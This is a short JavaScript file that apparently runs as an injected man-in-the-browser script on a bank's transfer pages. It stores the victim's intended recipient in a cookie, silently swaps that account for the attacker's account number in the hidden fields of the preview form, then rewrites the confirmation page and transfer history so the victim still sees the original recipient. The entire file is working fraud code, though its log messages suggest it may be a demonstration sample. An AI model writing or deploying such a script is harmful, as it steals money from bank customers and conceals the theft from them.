var myAccount = 123456;

if((window.location.href).toString().includes("/my_account/transfer_done")) {
    $(document).ready(function () {
        console.log("Account number changed");
        var accountNumber = getCookie("acc");
        $('#accountNumber').text("Account number: " + accountNumber);
    });
}
else if((window.location.href).toString().includes("/my_account/preview_transfer")) {
    $(document).ready(function () {
        var accountNumber = getCookie("acc");
        $("form input[type=hidden]").each(function () {
            if(this.value == accountNumber) {
                console.log("Account number updated to adversary account number");
                this.value = myAccount;
            }
        });
    });
}
else if((window.location.href).toString().includes("/my_account/transfer")) {
    $(document).ready(function () {
        console.log("Account number intercepted");
        $('#next').attr('onclick', "interceptTransfer()");
    });
}
else if((window.location.href).toString().includes("/my_account/my_transfers")) {
    $(document).ready(function () {
        console.log("Changed history");
        var accountNumber = getCookie("acc");
        $('small').each(function() {
            if($(this).text() == "Account number: " + myAccount) {
                $(this).text("Account number: " + accountNumber);
            }
        });
    });
}



function interceptTransfer() {
    document.cookie = "acc" + "=" + $('#accountNumber').val() + "; path=/";
}

function getCookie(cookieName) {
    var name = cookieName + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}